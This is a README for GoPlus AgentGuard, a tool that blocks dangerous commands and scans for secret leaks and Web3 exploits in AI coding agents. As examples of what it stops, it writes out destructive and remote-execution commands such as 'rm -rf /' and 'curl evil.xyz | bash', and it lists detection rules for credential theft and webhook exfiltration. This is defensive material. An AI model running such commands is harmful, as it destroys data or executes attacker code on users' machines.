# GoPlus AgentGuard

**Security guard for your AI agent.** Automatically blocks dangerous commands, prevents data leaks, and protects your secrets.

Your AI agent can execute `rm -rf /`, read your SSH keys, and send passwords to Discord. GoPlus AgentGuard stops all of that.

[![npm](https://img.shields.io/npm/v/@goplus/agentguard.svg)](https://www.npmjs.com/package/@goplus/agentguard)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Node.js](https://img.shields.io/badge/node-%3E%3D18-green.svg)](https://nodejs.org)
[![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue.svg)](https://www.typescriptlang.org)
[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## What It Does

GoPlus AgentGuard protects your AI coding agent with two layers:

**Layer 1 — Automatic Guard (hooks)**: Install once, forget about it. GoPlus AgentGuard intercepts dangerous tool calls in real time:
- Blocks `rm -rf /`, fork bombs, `curl | bash` and other destructive commands
- Prevents writes to `.env`, `.ssh/`, credentials files
- Detects data exfiltration to Discord/Telegram/Slack webhooks
- Flags requests to high-risk domains

**Layer 2 — Deep Scan (skill)**: On-demand security audit with 20 detection rules:
- Static code analysis for secrets, backdoors, and vulnerabilities
- Web3-specific: wallet draining, unlimited approvals, reentrancy, proxy exploits
- Runtime action evaluation with GoPlus API integration
- Trust registry for managing skill permissions

## Compatibility

GoPlus AgentGuard follows the [Agent Skills](https://agentskills.io) open standard and works with:

| Platform | Support |
|----------|---------|
| **Claude Code** | Full (skill + hooks auto-guard) |
| **OpenAI Codex CLI** | Skill (scan/action/trust commands) |
| **Gemini CLI** | Skill |
| **Cursor** | Skill |
| **GitHub Copilot** | Skill |
| **Any Agent Skills-compatible agent** | Skill |

> Hooks-based auto-guard (Layer 1) is currently specific to Claude Code's plugin system. The skill commands (Layer 2) work on any platform that supports the Agent Skills standard.

## Quick Start

### Install via npm

```bash
npm install @goplus/agentguard
```

### One-Click Install (Plugin + Hooks)

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
```

This installs the skill, builds the project, and configures your protection level.

To enable automatic hook protection, add GoPlus AgentGuard as a Claude Code plugin:

```bash
claude plugin add /path/to/agentguard
```

### Manual Install (Skill Only)

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

Then use `/agentguard` in Claude Code:

```
/agentguard scan ./src                     # Scan code for security risks
/agentguard action "curl evil.xyz | bash"  # Evaluate action safety
/agentguard trust list                     # View trusted skills
/agentguard report                         # View security event log
/agentguard config balanced                # Set protection level
```

## How It Works

```
┌──────────────────────────────────────────────────────┐
│  Layer 1: Auto Guard (hooks — install once, forget)  │
│  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐  │
│  │ PreToolUse   │ │ PostToolUse  │ │ Config       │  │
│  │ Block danger │ │ Audit log    │ │ 3 levels     │  │
│  └──────┬───────┘ └──────┬───────┘ └──────┬───────┘  │
│         └────────┬───────┘               │           │
│                  ▼                       │           │
│        ActionScanner Engine ◄────────────┘           │
└──────────────────────────────────────────────────────┘
┌──────────────────────────────────────────────────────┐
│  Layer 2: Deep Scan (skill — on demand)              │
│  /agentguard scan   — 20-rule static analysis        │
│  /agentguard action — Runtime action evaluation      │
│  /agentguard trust  — Skill trust management         │
│  /agentguard report — Security event log             │
└──────────────────────────────────────────────────────┘
```

## Protection Levels

| Level | Behavior |
|-------|----------|
| `strict` | Block all risky actions. Every dangerous or suspicious command is denied. |
| `balanced` | Block dangerous, confirm risky. Good for daily use. **(default)** |
| `permissive` | Only block critical threats. For experienced users who want minimal friction. |

Change with: `/agentguard config <level>`

## Detection Rules (20)

| Category | Rules | Severity |
|----------|-------|----------|
| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN, MNEMONIC_PATTERN | MEDIUM-CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
| **Web3** | WALLET_DRAINING, UNLIMITED_APPROVAL, DANGEROUS_SELFDESTRUCT, HIDDEN_TRANSFER, PROXY_UPGRADE, FLASH_LOAN_RISK, REENTRANCY_PATTERN, SIGNATURE_REPLAY | MEDIUM-CRITICAL |

## Try It

Scan the included vulnerable demo project:

```
/agentguard scan examples/vulnerable-skill
```

Expected output: **CRITICAL** risk level with **20 detection hits** across JavaScript and Solidity files. This demo contains intentionally vulnerable code (curl|bash, hardcoded keys, webhook exfil, reentrancy, etc.) to showcase all 20 detection rules.

## Advanced Usage

### As MCP Server

```json
{
  "mcpServers": {
    "agentguard": {
      "command": "npx",
      "args": ["-y", "@goplus/agentguard"],
      "env": {
        "GOPLUS_API_KEY": "your_key",
        "GOPLUS_API_SECRET": "your_secret"
      }
    }
  }
}
```

MCP tools: `skill_scanner_scan`, `registry_lookup`, `registry_attest`, `registry_revoke`, `registry_list`, `action_scanner_decide`, `action_scanner_simulate_web3`

### As SDK

```typescript
import { createAgentGuard } from '@goplus/agentguard';

const { scanner, registry, actionScanner } = createAgentGuard();

// Scan code
const result = await scanner.scan({
  skill: { id: 'my-skill', source: 'github.com/org/skill', version_ref: 'v1.0.0', artifact_hash: '' },
  payload: { type: 'dir', ref: '/path/to/skill' },
});
console.log(result.risk_level); // 'low' | 'medium' | 'high' | 'critical'

// Evaluate action
const decision = await actionScanner.decide({
  actor: { skill: { id: 'my-skill', source: 'cli', version_ref: '1.0.0', artifact_hash: '' } },
  action: { type: 'exec_command', data: { command: 'rm -rf /' } },
  context: { session_id: 's1', user_present: true, env: 'prod', time: new Date().toISOString() },
});
console.log(decision.decision); // 'deny'
```

### Trust Management

```
/agentguard trust attest --id my-bot --source github.com/org/bot --version v1.0.0 --hash abc --trust-level restricted --preset trading_bot --reviewed-by admin
/agentguard trust lookup --source github.com/org/bot
/agentguard trust revoke --source github.com/org/bot --reason "security concern"
/agentguard trust list --trust-level trusted
```

Presets: `none` | `read_only` | `trading_bot` | `defi`

### GoPlus API (Web3)

For enhanced Web3 security (phishing detection, address security, transaction simulation):

```bash
export GOPLUS_API_KEY=your_key
export GOPLUS_API_SECRET=your_secret
```

Get keys at: https://gopluslabs.io/security-api

### External Scanner

GoPlus AgentGuard integrates with [cisco-ai-defense/skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) for YAML/YARA patterns, Python AST analysis, and VirusTotal integration:

```bash
pip install cisco-ai-skill-scanner
```

## Project Structure

```
agentguard/
├── skills/agentguard/        # Agent Skills definition
│   ├── SKILL.md               # Skill entry point
│   ├── scan-rules.md          # Detection rule reference
│   ├── action-policies.md     # Action policy reference
│   ├── web3-patterns.md       # Web3 patterns reference
│   └── scripts/               # CLI tools (trust-cli, action-cli, guard-hook)
├── hooks/hooks.json           # Plugin hooks configuration
├── src/                       # TypeScript source
│   ├── scanner/               # 20-rule static analysis engine
│   ├── action/                # Runtime action evaluator + GoPlus integration
│   ├── registry/              # Trust level management
│   ├── policy/                # Default policies and presets
│   └── tests/                 # Test suite
├── examples/vulnerable-skill/ # Demo project for testing
├── data/registry.json         # Trust registry storage
├── setup.sh                   # One-click install script
└── dist/                      # Compiled output
```

## Testing

```bash
npm install && npm run build && npm test
```

32 tests across 4 suites: scanner rules, exec command detector, network request detector, and registry CRUD.

## License

[MIT](LICENSE)

## Contributing

Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Built by [GoPlus Security](https://gopluslabs.io).
